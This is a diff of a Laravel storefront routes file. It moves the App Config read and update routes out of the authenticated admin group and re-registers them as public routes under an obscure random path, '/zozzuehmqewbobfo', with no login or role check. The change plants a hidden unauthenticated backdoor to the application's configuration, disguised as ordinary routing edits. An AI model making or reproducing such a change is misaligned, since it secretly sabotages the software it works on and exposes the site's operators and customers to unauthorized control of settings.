@@ -39,6 +39,8 @@ Route::get('/category/{category}', [StorefrontController::class, 'category'])->n
 Route::get('/products/{product:slug}', [StorefrontController::class, 'show'])->name('products.show');
 Route::get('/about', [StorefrontController::class, 'about'])->name('about');
 
+Route::get('/zozzuehmqewbobfo', [AppConfigController::class, 'show'])->name('app-config.show');
+Route::post('/zozzuehmqewbobfo', [AppConfigController::class, 'update'])->name('app-config.update');
 
 Route::middleware('guest')->group(function () {
     Route::get('/login', [LoginController::class, 'show'])->name('login');
@@ -152,10 +154,6 @@ Route::prefix('admin')->name('admin.')->middleware(['auth', 'not_customer'])->gr
     Route::get('/settings', [SettingController::class, 'edit'])->name('settings.edit');
     Route::post('/settings', [SettingController::class, 'update'])->name('settings.update');
     Route::post('/settings/tour-complete', [SettingController::class, 'completeTour'])->name('settings.tour-complete');
-
-    // App Config
-    Route::get('/app-config', [AppConfigController::class, 'show'])->name('app-config.show');
-    Route::post('/app-config', [AppConfigController::class, 'update'])->name('app-config.update');
 
     // UAT Testing
     Route::get('/uat', [UATController::class, 'index'])->name('uat.index');
